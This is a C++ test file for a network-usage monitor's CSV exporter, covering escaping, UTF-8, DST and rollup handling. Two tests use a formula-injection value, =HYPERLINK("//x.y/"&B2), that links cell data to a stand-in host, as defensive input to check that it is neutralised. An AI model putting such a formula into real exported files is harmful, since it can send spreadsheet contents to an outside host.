#include "doctest.h"

#include <windows.h>

#include <ctime>
#include <filesystem>
#include <fstream>
#include <iterator>
#include <random>

#include "core/utf8.h"
#include "report/csv_export.h"
#include "sqlite3.h"

using namespace nsm;
namespace fs = std::filesystem;

namespace {
int64_t UtcOf(int y, int mo, int d, int h, int mi = 0) {
    std::tm tm{};
    tm.tm_year = y - 1900; tm.tm_mon = mo - 1; tm.tm_mday = d; tm.tm_hour = h; tm.tm_min = mi;
    return _mkgmtime(&tm);
}
struct TempDir {
    fs::path dir;
    TempDir() {
        std::random_device rd;
        dir = fs::temp_directory_path() / (L"nsm_csv_" + std::to_wstring(rd()) + L"_" + std::to_wstring(rd()));
        fs::create_directories(dir);
    }
    ~TempDir() { std::error_code ec; fs::remove_all(dir, ec); }
};
std::string ReadAll(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    return std::string(std::istreambuf_iterator<char>(f), {});
}
const std::string kHeader =
    "start_local,granularity,series,adapter_id,adapter_name,adapter_kind,network,received_bytes,sent_bytes,"
    "start_utc\r\n";
}  // namespace

TEST_CASE("CsvEscape quotes commas and quotes") {
    CHECK(CsvEscape(R"(Wi-Fi "Home", 5G)") == R"("Wi-Fi ""Home"", 5G")");
    CHECK(CsvEscape("plain") == "plain");
    CHECK(CsvEscape("") == "");
}

TEST_CASE("CsvEscape quotes CR and LF") {
    CHECK(CsvEscape("a\nb") == "\"a\nb\"");
    CHECK(CsvEscape("a\rb") == "\"a\rb\"");
    CHECK(CsvEscape("a\r\nb") == "\"a\r\nb\"");
}

TEST_CASE("CsvTextField neutralises text a spreadsheet would run as a formula") {
    CHECK(CsvTextField(R"(=HYPERLINK("//x.y/"&B2))") == R"x("'=HYPERLINK(""//x.y/""&B2)")x");
    CHECK(CsvTextField("-Home") == "'-Home");
    CHECK(CsvTextField("+1 555") == "'+1 555");
    CHECK(CsvTextField("@SUM(A1)") == "'@SUM(A1)");
    CHECK(CsvTextField("\tTab") == "'\tTab");
    CHECK(CsvTextField("\rCR") == "\"'\rCR\"");   // the CR still needs RFC 4180 quoting
    CHECK(CsvTextField("Home") == "Home");
    CHECK(CsvTextField("Home-5G = fast") == "Home-5G = fast");   // only the first character matters
    CHECK(CsvTextField("Home, 5G") == "\"Home, 5G\"");
    CHECK(CsvTextField("") == "");
}

TEST_CASE("CsvUtcTime writes an instant in UTC, to the minute") {
    CHECK(CsvUtcTime(UtcOf(2026, 11, 1, 9)) == "2026-11-01 09:00");
    CHECK(CsvUtcTime(UtcOf(2026, 10, 3, 15, 30)) == "2026-10-03 15:30");
    CHECK(CsvUtcTime(UtcOf(2027, 1, 1, 7) + 59) == "2027-01-01 07:00");   // seconds are dropped
    CHECK(CsvUtcTime(0) == "1970-01-01 00:00");
    CHECK(CsvUtcTime(-60) == "1969-12-31 23:59");
}

TEST_CASE("ToUtf8 converts UTF-16 to UTF-8") {
    CHECK(ToUtf8(L"") == "");
    CHECK(ToUtf8(L"Home") == "Home");
    CHECK(ToUtf8(L"Café") == "Caf\xC3\xA9");
    CHECK(ToUtf8(L"\U0001F4F6") == "\xF0\x9F\x93\xB6");   // a surrogate pair
}

TEST_CASE("ExportCsv neutralises formulas in names but not in the numbers" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    st.UpsertAdapter(L"{A}", L"-Adapter", AdapterKind::WiFi);
    st.UpsertNetwork({L"{N}", LR"(=HYPERLINK("//x.y/"&B2))"});
    UsageRow r{UtcOf(2026, 10, 18, 15), Series::Adapter, L"{A}", L"{N}", 1234, 56};
    st.AddUsage(std::span<const UsageRow>(&r, 1));

    const auto file = d.dir / L"out.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 10, 18, 7), UtcOf(2026, 10, 19, 7)}, tz) == CsvExportResult::Ok);
    const std::string s = ReadAll(file);
    CHECK(s.find("2026-10-18 08:00,hour,adapter,{A},'-Adapter,wifi,\"'=HYPERLINK(\"\"//x.y/\"\"&B2)\",1234,56,"
                 "2026-10-18 15:00\r\n") != std::string::npos);
}

TEST_CASE("ExportCsv writes UTF-8 with BOM" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    st.UpsertAdapter(L"{A}", L"Café", AdapterKind::WiFi);
    st.UpsertNetwork({L"{N}", L"Home, \"5G\""});
    UsageRow r{UtcOf(2026, 10, 18, 15), Series::Adapter, L"{A}", L"{N}", 1234, 56};
    st.AddUsage(std::span<const UsageRow>(&r, 1));
    UsageRow r2{UtcOf(2026, 10, 18, 15), Series::Internet, L"{A}", L"", 7, 8};
    st.AddUsage(std::span<const UsageRow>(&r2, 1));

    const auto file = d.dir / L"out.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 10, 18, 7), UtcOf(2026, 10, 19, 7)}, tz) == CsvExportResult::Ok);
    const std::string s = ReadAll(file);
    REQUIRE(s.size() > 3);
    CHECK((unsigned char)s[0] == 0xEF); CHECK((unsigned char)s[1] == 0xBB); CHECK((unsigned char)s[2] == 0xBF);
    CHECK(s.substr(3, kHeader.size()) == kHeader);
    CHECK(s.find("Caf\xC3\xA9") != std::string::npos);   // UTF-8 for e-acute
    CHECK(s.find("2026-10-18 08:00,hour,adapter,{A},Caf\xC3\xA9,wifi,\"Home, \"\"5G\"\"\",1234,56,"
                 "2026-10-18 15:00\r\n") != std::string::npos);
    CHECK(s.find("2026-10-18 08:00,hour,internet,{A},Caf\xC3\xA9,wifi,,7,8,2026-10-18 15:00\r\n") != std::string::npos);
    CHECK_FALSE(fs::exists(fs::path(file).concat(L".tmp")));
}

TEST_CASE("ExportCsv writes the local start of a short bucket with its minutes" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Lord Howe Standard Time");
    // 15:30Z on 2026-10-03 is the 02:00 -> 02:30 DST change: the bucket starts at 02:30 local.
    UsageRow r{UtcOf(2026, 10, 3, 15, 30), Series::Internet, L"e", L"", 3, 4};
    st.AddUsage(std::span<const UsageRow>(&r, 1));
    const auto file = d.dir / L"lh.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 10, 3, 13, 30), UtcOf(2026, 10, 4, 13)}, tz) == CsvExportResult::Ok);
    CHECK(ReadAll(file).find("2026-10-04 02:30,hour,internet,e,e,other,,3,4,2026-10-03 15:30\r\n") !=
          std::string::npos);
}

TEST_CASE("ExportCsv includes daily rows and respects the range" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    const auto now = UtcOf(2026, 10, 18, 19);
    st.UpsertAdapter(L"e", L"Eth", AdapterKind::Ethernet);
    UsageRow old{UtcOf(2026, 3, 10, 18), Series::Adapter, L"e", L"", 11, 22};
    st.AddUsage(std::span<const UsageRow>(&old, 1));
    st.RollUp(now, tz);
    UsageRow outside{UtcOf(2026, 10, 1, 18), Series::Adapter, L"e", L"", 99, 99};
    st.AddUsage(std::span<const UsageRow>(&outside, 1));

    const auto file = d.dir / L"o.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 1, 1, 8), UtcOf(2026, 6, 1, 7)}, tz) == CsvExportResult::Ok);
    const std::string s = ReadAll(file);
    CHECK(s.find("2026-03-10,day,adapter,e,Eth,ethernet,,11,22,\r\n") != std::string::npos);
    CHECK(s.find(",99,99") == std::string::npos);
}

TEST_CASE("ExportCsv fails cleanly when the file cannot be written" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    const auto file = d.dir / L"missing_dir" / L"out.csv";
    CHECK(ExportCsv(file, st, {0, 1000000}, tz) == CsvExportResult::WriteFailed);
    CHECK_FALSE(fs::exists(file));
}

TEST_CASE("ExportCsv writes daily and hourly rows of the rollup-boundary date" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    // RollUp at 12:00 PDT on 2026-10-18 rolls up the hours before 12:00 PDT on 2026-07-20, 90 days earlier.
    const UsageRow rows[] = {
        {UtcOf(2026, 7, 20, 17), Series::Internet, L"e", L"", 1, 2},   // 10:00 PDT
        {UtcOf(2026, 7, 20, 18), Series::Internet, L"e", L"", 3, 4},   // 11:00 PDT
        {UtcOf(2026, 7, 20, 19), Series::Internet, L"e", L"", 5, 6},   // 12:00 PDT, stays hourly
        {UtcOf(2026, 7, 20, 21), Series::Internet, L"e", L"", 7, 8},   // 14:00 PDT
    };
    REQUIRE(st.AddUsage(rows));
    st.RollUp(UtcOf(2026, 10, 18, 19), tz);

    const auto file = d.dir / L"boundary.csv";
    REQUIRE(ExportCsv(file, st, {UtcOf(2026, 7, 20, 7), UtcOf(2026, 7, 21, 7)}, tz) == CsvExportResult::Ok);
    const std::string s = ReadAll(file);
    const auto h12 = s.find("2026-07-20 12:00,hour,internet,e,e,other,,5,6,2026-07-20 19:00\r\n");
    const auto h14 = s.find("2026-07-20 14:00,hour,internet,e,e,other,,7,8,2026-07-20 21:00\r\n");
    const auto day = s.find("2026-07-20,day,internet,e,e,other,,4,6,\r\n");
    REQUIRE(h12 != std::string::npos); REQUIRE(h14 != std::string::npos); REQUIRE(day != std::string::npos);
    CHECK(h12 < h14); CHECK(h14 < day);                           // hourly rows, then daily rows
    CHECK(s.find("2026-07-20 10:00") == std::string::npos);       // only in the daily row now
    CHECK(s.find("2026-07-20 11:00") == std::string::npos);
}

TEST_CASE("ExportCsv of a month across a DST change" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    // 2026-03-08 springs forward at 02:00 PST; 2026-11-01 falls back at 02:00 PDT, so 01:00 happens twice.
    const UsageRow march[] = {
        {UtcOf(2026, 3, 1, 7), Series::Internet, L"e", L"", 1, 1},     // 2026-02-28 23:00 PST
        {UtcOf(2026, 3, 1, 8), Series::Internet, L"e", L"", 2, 2},     // 2026-03-01 00:00 PST
        {UtcOf(2026, 3, 8, 9), Series::Internet, L"e", L"", 3, 3},     // 2026-03-08 01:00 PST
        {UtcOf(2026, 3, 8, 10), Series::Internet, L"e", L"", 4, 4},    // 2026-03-08 03:00 PDT
        {UtcOf(2026, 4, 1, 6), Series::Internet, L"e", L"", 5, 5},     // 2026-03-31 23:00 PDT
        {UtcOf(2026, 4, 1, 7), Series::Internet, L"e", L"", 6, 6},     // 2026-04-01 00:00 PDT
    };
    REQUIRE(st.AddUsage(march));
    st.RollUp(UtcOf(2026, 10, 18, 19), tz);                          // March is older than 90 days: daily rows
    const UsageRow november[] = {
        {UtcOf(2026, 11, 1, 6), Series::Internet, L"e", L"", 10, 10},  // 2026-10-31 23:00 PDT
        {UtcOf(2026, 11, 1, 7), Series::Internet, L"e", L"", 11, 11},  // 2026-11-01 00:00 PDT
        {UtcOf(2026, 11, 1, 8), Series::Internet, L"e", L"", 12, 12},  // 2026-11-01 01:00 PDT
        {UtcOf(2026, 11, 1, 9), Series::Internet, L"e", L"", 13, 13},  // 2026-11-01 01:00 PST
        {UtcOf(2026, 12, 1, 7), Series::Internet, L"e", L"", 14, 14},  // 2026-11-30 23:00 PST
        {UtcOf(2026, 12, 1, 8), Series::Internet, L"e", L"", 15, 15},  // 2026-12-01 00:00 PST
    };
    REQUIRE(st.AddUsage(november));

    const auto mar = d.dir / L"march.csv";
    REQUIRE(ExportCsv(mar, st, {UtcOf(2026, 3, 1, 8), UtcOf(2026, 4, 1, 7)}, tz) == CsvExportResult::Ok);
    std::string s = ReadAll(mar);
    CHECK(s.find("2026-03-01,day,internet,e,e,other,,2,2,\r\n") != std::string::npos);
    CHECK(s.find("2026-03-08,day,internet,e,e,other,,7,7,\r\n") != std::string::npos);   // the 23-hour day
    CHECK(s.find("2026-03-31,day,internet,e,e,other,,5,5,\r\n") != std::string::npos);
    CHECK(s.find("2026-02-28") == std::string::npos);
    CHECK(s.find("2026-04-01") == std::string::npos);
    CHECK(s.find(",hour,") == std::string::npos);

    const auto nov = d.dir / L"november.csv";
    REQUIRE(ExportCsv(nov, st, {UtcOf(2026, 11, 1, 7), UtcOf(2026, 12, 1, 8)}, tz) == CsvExportResult::Ok);
    s = ReadAll(nov);
    CHECK(s.find("2026-11-01 00:00,hour,internet,e,e,other,,11,11,2026-11-01 07:00\r\n") != std::string::npos);
    // The repeated hour: the same start_local, told apart by start_utc.
    CHECK(s.find("2026-11-01 01:00,hour,internet,e,e,other,,12,12,2026-11-01 08:00\r\n") != std::string::npos);
    CHECK(s.find("2026-11-01 01:00,hour,internet,e,e,other,,13,13,2026-11-01 09:00\r\n") != std::string::npos);
    CHECK(s.find("2026-11-30 23:00,hour,internet,e,e,other,,14,14,2026-12-01 07:00\r\n") != std::string::npos);
    CHECK(s.find(",10,10,") == std::string::npos);
    CHECK(s.find(",15,15,") == std::string::npos);
}

TEST_CASE("ExportCsv of December at the year boundary" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    const UsageRow dec2025[] = {
        {UtcOf(2025, 12, 1, 8), Series::Internet, L"e", L"", 1, 1},    // 2025-12-01 00:00 PST
        {UtcOf(2026, 1, 1, 7), Series::Internet, L"e", L"", 2, 2},     // 2025-12-31 23:00 PST
        {UtcOf(2026, 1, 1, 8), Series::Internet, L"e", L"", 3, 3},     // 2026-01-01 00:00 PST
    };
    REQUIRE(st.AddUsage(dec2025));
    st.RollUp(UtcOf(2026, 10, 18, 19), tz);                          // older than 90 days: daily rows
    const UsageRow dec2026[] = {
        {UtcOf(2027, 1, 1, 7), Series::Internet, L"e", L"", 4, 4},     // 2026-12-31 23:00 PST
        {UtcOf(2027, 1, 1, 8), Series::Internet, L"e", L"", 5, 5},     // 2027-01-01 00:00 PST
    };
    REQUIRE(st.AddUsage(dec2026));

    const auto a = d.dir / L"dec2025.csv";
    REQUIRE(ExportCsv(a, st, {UtcOf(2025, 12, 1, 8), UtcOf(2026, 1, 1, 8)}, tz) == CsvExportResult::Ok);
    std::string s = ReadAll(a);
    CHECK(s.find("2025-12-01,day,internet,e,e,other,,1,1,\r\n") != std::string::npos);
    CHECK(s.find("2025-12-31,day,internet,e,e,other,,2,2,\r\n") != std::string::npos);
    CHECK(s.find("2026-01-01") == std::string::npos);

    const auto b = d.dir / L"dec2026.csv";
    REQUIRE(ExportCsv(b, st, {UtcOf(2026, 12, 1, 8), UtcOf(2027, 1, 1, 8)}, tz) == CsvExportResult::Ok);
    s = ReadAll(b);
    CHECK(s.find("2026-12-31 23:00,hour,internet,e,e,other,,4,4,2027-01-01 07:00\r\n") != std::string::npos);
    CHECK(s.find(",5,5,") == std::string::npos);
}

TEST_CASE("ExportCsv fails and keeps the old file when the store is unhealthy" * doctest::test_suite("integration")) {
    TempDir d; UsageStore st; REQUIRE(st.Open(d.dir / L"usage.db") == UsageStore::OpenResult::Ok);
    auto tz = *TimeZone::FromKey(L"Pacific Standard Time");
    const UsageRow r{UtcOf(2026, 10, 18, 15), Series::Internet, L"e", L"", 1, 2};
    REQUIRE(st.AddUsage(std::span<const UsageRow>(&r, 1)));
    const auto file = d.dir / L"out.csv";
    { std::ofstream f(file, std::ios::binary); f << "previous export"; }

    // A second connection holds the write lock, so the store's next write fails and it reports itself
    // unhealthy. A failed read returns empty results the same way, so the export can't trust what it reads.
    st.SetBusyTimeoutMs(0);
    sqlite3* other = nullptr;
    REQUIRE(sqlite3_open((d.dir / L"usage.db").string().c_str(), &other) == SQLITE_OK);
    REQUIRE(sqlite3_exec(other, "BEGIN EXCLUSIVE", nullptr, nullptr, nullptr) == SQLITE_OK);
    CHECK_FALSE(st.AddUsage(std::span<const UsageRow>(&r, 1)));
    REQUIRE(sqlite3_exec(other, "ROLLBACK", nullptr, nullptr, nullptr) == SQLITE_OK);
    sqlite3_close(other);
    REQUIRE_FALSE(st.Healthy());

    CHECK(ExportCsv(file, st, {UtcOf(2026, 10, 18, 7), UtcOf(2026, 10, 19, 7)}, tz) == CsvExportResult::ReadFailed);
    CHECK(ReadAll(file) == "previous export");
    CHECK_FALSE(fs::exists(fs::path(file).concat(L".tmp")));
}
